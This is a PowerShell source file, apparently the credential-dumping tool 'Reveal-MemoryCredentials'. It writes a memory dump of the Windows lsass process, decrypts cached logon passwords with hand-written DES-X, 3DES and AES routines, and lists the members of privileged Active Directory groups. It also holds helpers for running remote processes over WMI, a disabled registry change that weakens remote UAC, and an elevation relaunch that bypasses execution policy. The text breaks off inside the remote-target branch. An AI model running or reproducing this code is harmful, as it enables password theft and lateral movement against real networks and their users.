<#
#requires -version 4

.SYNOPSIS         
    Reveal credentials from memory dump

.NOTES
    Version:        0.2
    Author:         Pierre-Alexandre Braeken
    Creation Date:  2015-05-01

.CREDITS
    Thanks to Benjamin Delpy for his work on mimikatz and Francesco Picasso (@dfirfpi) for his work on DES-X.

#>
Param(
[string]$mode="2",
[string]$dump="gen",
[string]$server=""
)
#---------------------------------------------------------[Initialisations]--------------------------------------------------------
Set-StrictMode -version Latest

$scriptPath = split-path -parent $MyInvocation.MyCommand.Definition
$scriptFile = $MyInvocation.MyCommand.Definition
$launchDate = get-date -f "yyyyMMddHHmmss"
$logDirectoryPath = $scriptPath + "\" + $launchDate
$file = "$logDirectoryPath\lsass.dmp"
$DebuggingScript = "$scriptPath\bufferCommand.txt"
$fullScriptPath = (Resolve-Path -Path $DebuggingScript).Path

#----------------------------------------------------------[Declarations]----------------------------------------------------------

$scriptName = [System.IO.Path]::GetFileName($scriptFile)
$scriptVersion = "0.2"

if(!(Test-Path $logDirectoryPath)) {
    New-Item $logDirectoryPath -type directory | Out-Null
}

$logFileName = "Log_" + $launchDate + ".log"
$logPathName = "$logDirectoryPath\$logFileName"

$global:streamWriter = New-Object System.IO.StreamWriter $logPathName

if ((gwmi win32_computersystem).partofdomain -eq $true) {
    Import-Module activedirectory 
}

if ((gwmi win32_computersystem).partofdomain -eq $true) {
    if (Get-Module -ListAvailable -Name activedirectory) {
        Import-Module activedirectory
    } else {
        Write-Host "Module activedirectory does not exist, importing..."
        Import-Module ServerManager 
        Add-WindowsFeature RSAT-AD-PowerShell        
    }    
}

#-----------------------------------------------------------[Functions]------------------------------------------------------------

Function Start-Log {    
    [CmdletBinding()]  
    Param ([Parameter(Mandatory=$true)][string]$scriptName, [Parameter(Mandatory=$true)][string]$scriptVersion, 
        [Parameter(Mandatory=$true)][string]$streamWriter)
    Process{                  
        $global:streamWriter.WriteLine("================================================================================================")
        $global:streamWriter.WriteLine("[$ScriptName] version [$ScriptVersion] started at $([DateTime]::Now)")
        $global:streamWriter.WriteLine("================================================================================================`n")       
    }
}
 
Function Write-Log {
    [CmdletBinding()]  
    Param ([Parameter(Mandatory=$true)][string]$streamWriter, [Parameter(Mandatory=$true)][string]$infoToLog)  
    Process{    
        $global:streamWriter.WriteLine("$infoToLog")
    }
}
 
Function Write-Error {
    [CmdletBinding()]  
    Param ([Parameter(Mandatory=$true)][string]$streamWriter, [Parameter(Mandatory=$true)][string]$errorCaught, [Parameter(Mandatory=$true)][boolean]$forceExit)  
    Process{
        $global:streamWriter.WriteLine("Error: [$errorCaught]")        
        if ($forceExit -eq $true){
            End-Log -streamWriter $global:streamWriter
            break;
        }
    }
}
 
Function End-Log { 
    [CmdletBinding()]  
    Param ([Parameter(Mandatory=$true)][string]$streamWriter)  
    Process{    
        $global:streamWriter.WriteLine("`n================================================================================================")
        $global:streamWriter.WriteLine("Script ended at $([DateTime]::Now)")
        $global:streamWriter.WriteLine("================================================================================================")
  
        $global:streamWriter.Close()   
    }
}

function Set-RegistryKey($computername, $parentKey, $nameRegistryKey, $valueRegistryKey) {
    try{    
        $remoteBaseKeyObject = [microsoft.win32.registrykey]::OpenRemoteBaseKey('LocalMachine',$computername)     
        $regKey = $remoteBaseKeyObject.OpenSubKey($parentKey,$true)
        $regKey.Setvalue("$nameRegistryKey", "$valueRegistryKey", [Microsoft.Win32.RegistryValueKind]::DWORD) 
        $remoteBaseKeyObject.close()
    }
    catch {
        $_.Exception
    }
}

function CreateDirectoryIfNeeded ( [string] $directory ) {
	if (!(Test-Path -Path $directory -type "Container")) {
		New-Item -type directory -Path $directory > $null
	}
}

function Set-SymbolServer {              
    $cacheDirectory = "c:\SYMBOLS\PUBLIC"     
    $refSrcPath = "$cacheDirectory*http://referencesource.microsoft.com/symbols"
    $msdlPath = "$cacheDirectory*http://msdl.microsoft.com/download/symbols"    
    $envPath = "SRV*$refSrcPath;SRV*$msdlPath"    
    CreateDirectoryIfNeeded -directory $cacheDirectory
    $env:_NT_SYMBOL_PATH = $envPath    
}

function Write-Minidump ($process, $dumpFilePath) {
    $windowsErrorReporting = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
    $windowsErrorReportingNativeMethods = $windowsErrorReporting.GetNestedType('NativeMethods', 'NonPublic')
    $flags = [Reflection.BindingFlags] 'NonPublic, Static'
    $miniDumpWriteDump = $windowsErrorReportingNativeMethods.GetMethod('MiniDumpWriteDump', $flags)
    $miniDumpWithFullMemory = [UInt32] 2

    $processId = $process.Id
    $processName = $process.Name
    $processHandle = $process.Handle
    $processFileName = "$($processName).dmp"

    $processDumpPath = "$dumpFilePath\$processFileName"

    $fileStream = New-Object IO.FileStream($processDumpPath, [IO.FileMode]::Create)
    try{
    $result = $miniDumpWriteDump.Invoke($null, @($processHandle,$processId,$fileStream.SafeFileHandle,$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
    }
    catch{
        $_.Exception()
    }

    $fileStream.Close()       
}

function Get-DecryptTripleDESPassword($password, $key, $initializationVector) {  
    try{
        $arrayPassword = $password -split ', '
        $passwordByte = @()
        foreach($ap in $arrayPassword){
            $passwordByte += [System.Convert]::ToByte($ap,16)     
        }

        $arrayKey = $key -split ', '
        $keyByte = @()
        foreach($ak in $arrayKey){
            $keyByte += [System.Convert]::ToByte($ak,16)        
        }

        $arrayInitializationVector = $initializationVector -split ', '
        $initializationVectorByte = @()
        foreach($aiv in $arrayInitializationVector){
            $initializationVectorByte += [System.Convert]::ToByte($aiv,16)        
        }
 
        $TripleDES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
                
        $TripleDES.IV = $initializationVectorByte
        $TripleDES.Key = $keyByte
        $TripleDES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $TripleDES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $decryptorObject = $TripleDES.CreateDecryptor()
        [byte[]] $outBlock = $decryptorObject.TransformFinalBlock($passwordByte, 0 , $passwordByte.Length)

        $TripleDES.Clear()

        return [System.Text.UnicodeEncoding]::Unicode.GetString($outBlock)
     }
     catch {
        #Write-Error "$error[0]"
    }
}

function Get-DecryptAESPassword($password, $key, $initializationVector) {
    try{

        $arrayPassword = $password -split ', '
        $passwordByte = @()
        foreach($ap in $arrayPassword){
            $passwordByte += [System.Convert]::ToByte($ap,16)     
        }

        $arrayKey = $key -split ', '
        $keyByte = @()
        foreach($ak in $arrayKey){
            $keyByte += [System.Convert]::ToByte($ak,16)        
        }

        $arrayInitializationVector = $initializationVector -split ', '
        $initializationVectorByte = @()
        foreach($aiv in $arrayInitializationVector){
            $initializationVectorByte += [System.Convert]::ToByte($aiv,16)        
        }
        $AESObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                
        $AESObject.IV = $initializationVectorByte
        $AESObject.Key = $keyByte
        $decryptorObject = $AESObject.CreateDecryptor()
        [byte[]] $outBlock = $decryptorObject.TransformFinalBlock($passwordByte, 0 , $passwordByte.Length)

        $AESObject.Clear()

        return [System.Text.UnicodeEncoding]::Unicode.GetString($outBlock)
    }
    catch {
        Write-host "$error[0]"
    }
}

function Run-WmiRemoteProcess {
    Param(
        [string]$computername=$env:COMPUTERNAME,
        [string]$cmd=$(Throw "You must enter the full path to the command which will create the process."),
        [int]$timeout = 0
    )
 
    Write-Host "Process to create on $computername is $cmd"
    [wmiclass]$wmi="\\$computername\root\cimv2:win32_process"
    # Exit if the object didn't get created
    if (!$wmi) {return}
 
    try{
    $remote=$wmi.Create($cmd)
    }
    catch{
        $_.Exception
    }
    $test =$remote.returnvalue
    if ($remote.returnvalue -eq 0) {
        Write-Host ("Successfully launched $cmd on $computername with a process id of " + $remote.processid)
    } else {
        Write-Host ("Failed to launch $cmd on $computername. ReturnValue is " + $remote.ReturnValue)
    }    
    return
}
$sboxul = New-Object 'object[,]' 8,64
$string = "0x02080800,0x00080000,0x02000002,0x02080802,0x02000000,0x00080802,0x00080002,0x02000002,0x00080802,0x02080800,0x02080000,0x00000802,0x02000802,0x02000000,0x00000000,0x00080002,0x00080000,0x00000002,0x02000800,0x00080800,0x02080802,0x02080000,0x00000802,0x02000800,0x00000002,0x00000800,0x00080800,0x02080002,0x00000800,0x02000802,0x02080002,0x00000000,0x00000000,0x02080802,0x02000800,0x00080002,0x02080800,0x00080000,0x00000802,0x02000800,0x02080002,0x00000800,0x00080800,0x02000002,0x00080802,0x00000002,0x02000002,0x02080000,0x02080802,0x00080800,0x02080000,0x02000802,0x02000000,0x00000802,0x00080002,0x00000000,0x00080000,0x02000000,0x02000802,0x02080800,0x00000002,0x02080002,0x00000800,0x00080802"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[0,$j] = $s
    $j++
}

$string = "0x40108010,0x00000000,0x00108000,0x40100000,0x40000010,0x00008010,0x40008000,0x00108000,0x00008000,0x40100010,0x00000010,0x40008000,0x00100010,0x40108000,0x40100000,0x00000010,0x00100000,0x40008010,0x40100010,0x00008000,0x00108010,0x40000000,0x00000000,0x00100010,0x40008010,0x00108010,0x40108000,0x40000010,0x40000000,0x00100000,0x00008010,0x40108010,0x00100010,0x40108000,0x40008000,0x00108010,0x40108010,0x00100010,0x40000010,0x00000000,0x40000000,0x00008010,0x00100000,0x40100010,0x00008000,0x40000000,0x00108010,0x40008010,0x40108000,0x00008000,0x00000000,0x40000010,0x00000010,0x40108010,0x00108000,0x40100000,0x40100010,0x00100000,0x00008010,0x40008000,0x40008010,0x00000010,0x40100000,0x00108000"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[1,$j] = $s
    $j++
}
$string = "0x04000001,0x04040100,0x00000100,0x04000101,0x00040001,0x04000000,0x04000101,0x00040100,0x04000100,0x00040000,0x04040000,0x00000001,0x04040101,0x00000101,0x00000001,0x04040001,0x00000000,0x00040001,0x04040100,0x00000100,0x00000101,0x04040101,0x00040000,0x04000001,0x04040001,0x04000100,0x00040101,0x04040000,0x00040100,0x00000000,0x04000000,0x00040101,0x04040100,0x00000100,0x00000001,0x00040000,0x00000101,0x00040001,0x04040000,0x04000101,0x00000000,0x04040100,0x00040100,0x04040001,0x00040001,0x04000000,0x04040101,0x00000001,0x00040101,0x04000001,0x04000000,0x04040101,0x00040000,0x04000100,0x04000101,0x00040100,0x04000100,0x00000000,0x04040001,0x00000101,0x04000001,0x00040101,0x00000100,0x04040000"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[2,$j] = $s
    $j++
}
$string = "0x00401008,0x10001000,0x00000008,0x10401008,0x00000000,0x10400000,0x10001008,0x00400008,0x10401000,0x10000008,0x10000000,0x00001008,0x10000008,0x00401008,0x00400000,0x10000000,0x10400008,0x00401000,0x00001000,0x00000008,0x00401000,0x10001008,0x10400000,0x00001000,0x00001008,0x00000000,0x00400008,0x10401000,0x10001000,0x10400008,0x10401008,0x00400000,0x10400008,0x00001008,0x00400000,0x10000008,0x00401000,0x10001000,0x00000008,0x10400000,0x10001008,0x00000000,0x00001000,0x00400008,0x00000000,0x10400008,0x10401000,0x00001000,0x10000000,0x10401008,0x00401008,0x00400000,0x10401008,0x00000008,0x10001000,0x00401008,0x00400008,0x00401000,0x10400000,0x10001008,0x00001008,0x10000000,0x10000008,0x10401000"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[3,$j] = $s
    $j++
}
$string = "0x08000000,0x00010000,0x00000400,0x08010420,0x08010020,0x08000400,0x00010420,0x08010000,0x00010000,0x00000020,0x08000020,0x00010400,0x08000420,0x08010020,0x08010400,0x00000000,0x00010400,0x08000000,0x00010020,0x00000420,0x08000400,0x00010420,0x00000000,0x08000020,0x00000020,0x08000420,0x08010420,0x00010020,0x08010000,0x00000400,0x00000420,0x08010400,0x08010400,0x08000420,0x00010020,0x08010000,0x00010000,0x00000020,0x08000020,0x08000400,0x08000000,0x00010400,0x08010420,0x00000000,0x00010420,0x08000000,0x00000400,0x00010020,0x08000420,0x00000400,0x00000000,0x08010420,0x08010020,0x08010400,0x00000420,0x00010000,0x00010400,0x08010020,0x08000400,0x00000420,0x00000020,0x00010420,0x08010000,0x08000020"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[4,$j] = $s
    $j++
}
$string = "0x80000040,0x00200040,0x00000000,0x80202000,0x00200040,0x00002000,0x80002040,0x00200000,0x00002040,0x80202040,0x00202000,0x80000000,0x80002000,0x80000040,0x80200000,0x00202040,0x00200000,0x80002040,0x80200040,0x00000000,0x00002000,0x00000040,0x80202000,0x80200040,0x80202040,0x80200000,0x80000000,0x00002040,0x00000040,0x00202000,0x00202040,0x80002000,0x00002040,0x80000000,0x80002000,0x00202040,0x80202000,0x00200040,0x00000000,0x80002000,0x80000000,0x00002000,0x80200040,0x00200000,0x00200040,0x80202040,0x00202000,0x00000040,0x80202040,0x00202000,0x00200000,0x80002040,0x80000040,0x80200000,0x00202040,0x00000000,0x00002000,0x80000040,0x80002040,0x80202000,0x80200000,0x00002040,0x00000040,0x80200040"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[5,$j] = $s
    $j++
}
$string = "0x00004000,0x00000200,0x01000200,0x01000004,0x01004204,0x00004004,0x00004200,0x00000000,0x01000000,0x01000204,0x00000204,0x01004000,0x00000004,0x01004200,0x01004000,0x00000204,0x01000204,0x00004000,0x00004004,0x01004204,0x00000000,0x01000200,0x01000004,0x00004200,0x01004004,0x00004204,0x01004200,0x00000004,0x00004204,0x01004004,0x00000200,0x01000000,0x00004204,0x01004000,0x01004004,0x00000204,0x00004000,0x00000200,0x01000000,0x01004004,0x01000204,0x00004204,0x00004200,0x00000000,0x00000200,0x01000004,0x00000004,0x01000200,0x00000000,0x01000204,0x01000200,0x00004200,0x00000204,0x00004000,0x01004204,0x01000000,0x01004200,0x00000004,0x00004004,0x01004204,0x01000004,0x01004200,0x01004000,0x00004004"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[6,$j] = $s
    $j++
}
$string = "0x20800080,0x20820000,0x00020080,0x00000000,0x20020000,0x00800080,0x20800000,0x20820080,0x00000080,0x20000000,0x00820000,0x00020080,0x00820080,0x20020080,0x20000080,0x20800000,0x00020000,0x00820080,0x00800080,0x20020000,0x20820080,0x20000080,0x00000000,0x00820000,0x20000000,0x00800000,0x20020080,0x20800080,0x00800000,0x00020000,0x20820000,0x00000080,0x00800000,0x00020000,0x20000080,0x20820080,0x00020080,0x20000000,0x00000000,0x00820000,0x20800080,0x20020080,0x20020000,0x00800080,0x20820000,0x00000080,0x00800080,0x20020000,0x20820080,0x00800000,0x20800000,0x20000080,0x00820000,0x00020080,0x20020080,0x20800000,0x00000080,0x20820000,0x00820080,0x00000000,0x20000000,0x20800080,0x00020000,0x00820080"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[7,$j] = $s
    $j++
}

function rol ($val, $r_bits, $max_bits) {        
    return (($val -shl ($r_bits % $max_bits)) -band ([math]::Pow(2,$max_bits)-1) -bor ($val -band ([math]::Pow(2,$max_bits)-1)) -shr ($max_bits-($r_bits % $max_bits)))        
}
   
function ror ($val, $r_bits, $max_bits) {       
    return ((($val -band ([math]::Pow(2,$max_bits)-1)) -shr $r_bits % $max_bits) -bor ($val -shl ($max_bits-($r_bits % $max_bits)) -band ([math]::Pow(2,$max_bits)-1)))        
}

function loop($des_key, $dst, $src, $ecx, $round){
    $eax = $des_key.Substring($round*8,4)
    $edx = $des_key.Substring($round*8+4,4)
    $eax = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($eax),0);
    $edx = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($edx),0);
    $ebx = 0
    $eax = $eax -bxor $src
    $edx = $edx -bxor $src
    $eax = $eax -band "0x0FCFCFCFC"
    $edx = $edx -band "0x0CFCFCFCF"
    $ebx = ($ebx -band "0xFFFFFF00") -bor ($eax -band "0x000000FF")
    $ecx = ($ecx -band "0xFFFFFF00") -bor (($eax -band "0x0000FF00") -shr 8)
    $edx = ror $edx 4 32
    $ebp = [Convert]::ToInt64(($sboxul[0,($ebx -shr 2)]),16)
    $ebx = ($ebx -band "0xFFFFFF00") -bor ($edx -band "0x000000FF")
    $dst = $dst -bxor $ebp
    $ebp = [Convert]::ToInt64(($sboxul[2,($ecx -shr 2)]),16)
    $dst = $dst -bxor $ebp
    $ecx = ($ecx -band "0xFFFFFF00") -bor (($edx -band "0x0000FF00") -shr 8)
    $eax = $eax -shr "0x10"
    $ebp = [Convert]::ToInt64(($sboxul[1,($ebx -shr 2)]),16)
    $dst = $dst -bxor $ebp
    $ebx = ($ebx -band "0xFFFFFF00") -bor (($eax -band "0x0000FF00") -shr 8)
    $edx = $edx -shr "0x10"
    $ebp = [Convert]::ToInt64(($sboxul[3,($ecx -shr 2)]),16)
    $dst = $dst -bxor $ebp
    $ecx = ($ecx -band "0xFFFFFF00") -bor (($edx -band "0x0000FF00") -shr 8)
    $eax = $eax -band "0xFF"
    $edx = $edx -band "0xFF"
    $ebx = [Convert]::ToInt64(($sboxul[6,($ebx -shr 2)]),16)
    $dst = $dst -bxor $ebx
    $ebx = [Convert]::ToInt64(($sboxul[7,($ecx -shr 2)]),16)
    $dst = $dst -bxor $ebx
    $ebx = [Convert]::ToInt64(($sboxul[4,($eax -shr 2)]),16)
    $dst = $dst -bxor $ebx
    $ebx = [Convert]::ToInt64(($sboxul[5,($edx -shr 2)]),16)
    $dst = $dst -bxor $ebx
    return $dst,$ecx    
}

function decrypt($des_key128,$encrypted){
    $esi = $encrypted    
    $eax = $esi.Substring(0,4)
    $eax = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($eax),0);    
    $edi = $esi.Substring(4)
    $edi = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($edi),0);
    $eax = rol $eax "4" 32
    $esi = $eax
    $eax = $eax -bxor $edi
    $eax = $eax -band "0x0F0F0F0F0"
    $esi = $esi -bxor $eax
    $edi = $edi -bxor $eax
    $edi = rol $edi "0x14" 32
    $eax = $edi
    $edi = $edi -bxor $esi
    $edi = $edi -band "0x0FFF0000F"
    $eax = $eax -bxor $edi
    $esi = $esi -bxor $edi
    $eax = rol $eax "0x0e" 32
    $edi = $eax
    $eax = $eax -bxor $esi
    $eax = $eax -band "0x33333333"
    $edi = $edi -bxor $eax
    $esi = $esi -bxor $eax
    $esi = rol $esi "0x16" 32
    $eax = $esi
    $esi = $esi -bxor $edi
    $esi = $esi -band "0x3FC03FC"
    $eax = $eax -bxor $esi
    $edi = $edi -bxor $esi
    $eax = rol $eax "0x9" 32
    $esi = $eax
    $eax = $eax -bxor $edi
    $eax = $eax -band "0x0AAAAAAAA"
    $esi = $esi -bxor $eax    
    $edi = $edi -bxor $eax
    $edi = rol $edi "0x1" 32
    $ecx = 0
    $round = 15
    while($round -gt 0) { 
        $edi, $ecx = loop $des_key128 $edi $esi $ecx $round
        $ind = $round - 1
        $esi, $ecx = loop $des_key128 $esi $edi $ecx $ind  
        $round = $round - 2
    }    
    $esi = ror $esi 1 32
    $eax = $edi
    $edi = $edi -bxor $esi
    $edi = $edi -band "0x0AAAAAAAA"
    $eax = $eax -bxor $edi
    $esi = $esi -bxor $edi
    $eax = rol $eax "0x17" 32
    $edi = $eax
    $eax = $eax -bxor $esi
    $eax = $eax -band "0x3FC03FC"
    $edi = $edi -bxor $eax
    $esi = $esi -bxor $eax
    $edi = rol $edi "0x0A" 32
    $eax = $edi
    $edi = $edi -bxor $esi
    $edi = $edi -band "0x33333333"
    $eax = $eax -bxor $edi
    $esi = $esi -bxor $edi
    $esi = rol $esi "0x12" 32
    $edi = $esi
    $esi = $esi -bxor $eax
    $esi = $esi -band "0x0FFF0000F"
    $edi = $edi -bxor $esi
    $eax = $eax -bxor $esi
    $edi = rol $edi "0x0C" 32
    $esi = $edi
    $edi = $edi -bxor $eax
    $edi = $edi -band "0x0F0F0F0F0"
    $esi = $esi -bxor $edi
    $eax = $eax -bxor $edi
    $eax = ror $eax 4 32
    $encoding = [System.Text.Encoding]::GetEncoding("windows-1252")
    $eax = $encoding.GetString([BitConverter]::GetBytes($eax))
    $esi = $encoding.GetString([BitConverter]::GetBytes($esi))
    return $eax,$esi
}
function XP_DESX($desx_key,$encrypted){
    $eax = $encrypted.Substring(0,4)
    $esi = $encrypted.Substring(4,4)
    $eax = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($eax),0);
    $esi = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($esi),0);
    $ecx = $desx_key.Substring(8,4)
    $edx = $desx_key.Substring(12,4)
    $ecx = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($ecx),0);
    $edx = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($edx),0);
    $ecx = $ecx -bxor $eax
    $edx = $edx -bxor $esi    
    $encoding = [System.Text.Encoding]::GetEncoding("windows-1252")
    $ecx = $encoding.GetString([BitConverter]::GetBytes($ecx))
    $edx = $encoding.GetString([BitConverter]::GetBytes($edx))
    $enc_64 = $ecx + $edx
    $des_key128 = $desx_key.Substring(16,128)
    $decrypted,$decrypted2 = decrypt $des_key128 $enc_64    
    $ecx = $desx_key.Substring(0,4)
    $ebx = $desx_key.Substring(4,4)
    $ecx = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($ecx),0);
    $ebx = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($ebx),0);
    $edx = $decrypted    
    $eax = $decrypted2    
    $edx = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($edx),0);
    $eax = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($eax),0);    
    $edx = $edx -bxor $ecx
    $eax = $eax -bxor $ebx   
    $encoding = [System.Text.Encoding]::GetEncoding("windows-1252")
    $edx = $encoding.GetString([BitConverter]::GetBytes($edx))
    $eax = $encoding.GetString([BitConverter]::GetBytes($eax))    
    return $edx,$eax
}
function XP_CBC_DESX($encrypted, $desx_key, $feedback) {
    $decrypted,$decrypted2 = XP_DESX $desx_key $encrypted
    $decrypted = $decrypted + $decrypted2
    $decrypted_temp = [BitConverter]::ToUInt64([Text.Encoding]::Default.GetBytes($decrypted),0);
    $decrypted_temp2 = [BitConverter]::ToUInt64([Text.Encoding]::Default.GetBytes($feedback),0);
    $decrypted_temp = $decrypted_temp -bxor $decrypted_temp2    
    $decrypted = [BitConverter]::GetBytes($decrypted_temp);
    $feedback = $encrypted
    return $decrypted,$feedback

}
function XP_LsaDecryptMemory($DESXKeyHex, $g_Feedback, $cipherToDecrypt) {
    $desx_key = $DESXKeyHex
    $feedback = $g_Feedback
    $measureObject = $cipherToDecrypt | Measure-Object -Character
    $count = $measureObject.Characters
    $measureObject = $g_Feedback | Measure-Object -Character
    $countFeed = $measureObject.Characters    
    $decrypted = ''            
    $count = $count -shr 3
    $i = 0    
    while($i -lt $count) {         
        $decrypted8, $feedback = XP_CBC_DESX $cipherToDecrypt.Substring($i*8,8) $desx_key $feedback
        $decrypted += $decrypted8
        $i++
    }
    return $decrypted    
}

# ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
# Function Name 'Get-DistinguishedNameFromFQDN' - Convert domain name into distinguished name
# ________________________________________________________________________
function Get-DistinguishedNameFromFQDN {
	param([string]$domainFullQualifiedDomain=(throw "You must specify the domain Full Qualified Name !"))
    Begin{
        Write-Log -streamWriter $global:streamWriter -infoToLog "Get distinguished name from domain name"
    }
    Process{
        Try{
            $distinguishedName = "" 
	        $obj = $domainFullQualifiedDomain.Replace(',','\,').Split('/')
	        $obj[0].split(".") | ForEach-Object { $distinguishedName += ",DC=" + $_}
	        $distinguishedName = $distinguishedName.Substring(1)
            Write-Log -streamWriter $global:streamWriter -infoToLog "Domain name is $domainFullQualifiedDomain, distinguished name is $distinguishedName"
	        return $distinguishedName
        }    
        Catch{
            Write-Error -streamWriter $global:streamWriter -errorCaught $_.Exception -forceExit $True
            Break
        }
    }  
    End{
        If($?){
            Write-Log -streamWriter $global:streamWriter -infoToLog "Completed Successfully."
            Write-Log -streamWriter $global:streamWriter -infoToLog " "
        }
    }  	
}

# ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
# Function Name 'Stop-Script' - Stop the script execution
# ________________________________________________________________________

function Stop-Script () {   
    Begin{
        Write-Log -streamWriter $global:streamWriter -infoToLog "--- Script terminating ---"
    }
    Process{        
        "Script terminating..." 
        Write-Host "================================================================================================"
        End-Log -streamWriter $global:streamWriter       
        Exit
    }
}

#----------------------------------------------------------[Execution]----------------------------------------------------------
Start-Log -scriptName $scriptName -scriptVersion $scriptVersion -streamWriter $global:streamWriter
cls
Write-Host "================================================================================================"
Write-Host -object (("1*0½1*1½1*3½1*0½1*1½1*1½1*3½1*1½*1½1*2½1*3½1*1½1*1½1*1½1*9½1*10½1*11½1*11½1*10½1*12½1*1½1*13½1*14½1*15½1*1½1*12½1*14½1*16½1*13½1*15½1*1½1*17½1*18½1*19½1*19½1*16½1*13½1*1½1*20½1*21½1*22½1*0½1*1½1*1½0*1½1*5½1*1½1*7½1*1½1*1½1*1½1*1½1*1½1*1½1*1½1*23½1*18½1*27½1*24½1*18½1*15½1*25½1*15½1*26½1*8½1*28½1*29½1*18½1*16½1*11½1*6½1*30½1*10½1*29½1*0½1*6½1*5½1*1½1*8½1*1½1*7½1*6½1*1½1*0"-split "½")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99"-split "T")[$matches[2]])"*$matches[1]}})-separator ""

if ((gwmi win32_computersystem).partofdomain -eq $true) {
    $enterpriseAdminsGroup = "Enterprise Admins"
    $schemaAdminsGroup = "Schema Admins"
    $domainAdminsGroup = "Domain Admins"
    $administratorsGroup = " Administrators"
    $backupOperatorsGroup = "Backup Operators"    
    $enterpriseAdmins = ""
    $schemaAdmins = ""
    $domainAdmins = ""
    $administrators = ""
    $backupOperators = ""
    try {$enterpriseAdmins = (Get-ADGroupMember $enterpriseAdminsGroup -Recursive).DistinguishedName}catch{}
    try {$schemaAdmins = (Get-ADGroupMember $schemaAdminsGroup -Recursive).DistinguishedName}catch{}
    try {$domainAdmins = (Get-ADGroupMember $domainAdminsGroup -Recursive).DistinguishedName}catch{}
    try {$administrators = (Get-ADGroupMember $administratorsGroup -Recursive).DistinguishedName}catch{}
    try {$backupOperators = (Get-ADGroupMember $backupOperatorsGroup -Recursive).DistinguishedName}catch{}            
    
} 

<#
$parentKey = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$nameRegistryKey = "LocalAccountTokenFilterPolicy"
$valueRegistryKey = "1"

Set-RegistryKey $Server $parentKey $nameRegistryKey $valueRegistryKey)
#>

$myComputer = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
$myUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$amIAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent())

$adminFlag = $amIAdmin.IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if($adminFlag -eq $true){
    $adminMessage = " with administrator rights on " 
}
else {
    $adminMessage = " without administrator rights on "
}

Write-Host "RWMC runs with user " -nonewline; Write-Host $myUser.Name -f Red -nonewline; Write-Host $adminMessage -nonewline; Write-Host $myComputer -f Red -nonewline; Write-Host " computer"
if($adminFlag -eq $false){
    Write-Host "You have to launch this script with " -nonewline; Write-Host "local Administrator rights!" -f Red
    
    $scriptPath = Split-Path $MyInvocation.InvocationName    
    $RWMC = $scriptPath + "\Reveal-MemoryCredentials.ps1"
    $ArgumentList = 'Start-Process -FilePath powershell.exe -ArgumentList \"-ExecutionPolicy Bypass -File "{0}"\" -Verb Runas' -f $RWMC;
    Start-Process -FilePath powershell.exe -ArgumentList $ArgumentList -Wait -NoNewWindow;    
    Stop-Script
}

Write-Host "================================================================================================"
$remoteLocalFile = Read-Host 'Local computer, Remote computer or from a dump file ?
1) local
2) remote
3) dump

Enter menu number and press <ENTER>'
switch ($remoteLocalFile){
    "1" {$dump = "gen"}
    "2" {$dump = "remote"}
    "3" {$dump = "dump"}
    default {Write-Output "The option could not be determined... generate local dump"}
}

$osArchitecture = ""
$operatingSystem = ""
if($dump -eq "dump") {
    $dump = Read-Host 'Enter the path of your lsass process dump'
    $mode = Read-Host 'Mode (1 (Win 7 and 2008r2), 132 (Win 7 32 bits), 2 (Win 8 and 2012), 2r2 (Win 10 and 2012r2), 8.1 (Win 8.1) or 3 (Windows 2003))?'
    switch ($mode){
        1 {Write-Output "Try to reveal password for Windows 7 or 2008r2"}
        132 {Write-Output "Try to reveal password for Windows 7 32bits"}
        2 {Write-Output "Try to reveal password for Windows 8 or 2012"}
        "2r2" {Write-Output "Try to reveal password for Windows 10 or 2012r2"}
        "8.1" {Write-Output "Try to reveal password for Windows 8.1"}
        3 {Write-Output "Try to reveal password for Windows XP or 2003"}
        default {
                Write-Output "The mode could not be determined... terminating"
                Stop-Script
        }
    }
}
else {
    if($dump -eq "remote") { 
        $dump = ""
        $server = Read-Host 'Enter the name of the remote server'
        $operatingSystem = (Get-WmiObject Win32_OperatingSystem -ComputerName $server).version
        $osArchitecture =  (Get-WmiObject Win32_OperatingSystem -ComputerName $server).OSArchitecture
